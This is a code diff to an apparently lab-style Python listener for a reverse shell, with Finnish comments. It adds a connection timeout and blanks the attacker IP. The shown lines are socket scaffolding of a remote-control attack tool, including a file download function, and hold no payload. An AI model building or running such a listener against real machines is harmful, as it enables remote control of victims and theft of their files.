@@ -14,6 +14,9 @@
 
 import socket
 import os
+import sys
+
+socket.setdefaulttimeout(15)
 
 def clear_screen():
     os.system('cls')
@@ -38,7 +41,7 @@ def download(target, command):
 #pääfunktio
 def main():
     #vaihtakaa oma ip
-    attacker_ip = '192.168.56.1'
+    attacker_ip = ''
     port        = 8888
     
     #luodaan socket (ipv4 & tcp) ja jäädään odottamaan yhteyttä
@@ -48,7 +51,12 @@ def main():
     print(f'\n[+] Waiting for new connection...')
 
     #target on itse yhteys ja target_addr on tuple (index0 = ip ja index1 = random port)
-    target, target_addr = s.accept()
+    try:
+        target, target_addr = s.accept()
+    except TimeoutError:
+        print('timeout')
+        sys.exit(1)
+
 
     print(f'[+] New Connection from {target_addr[0]}\n')
 
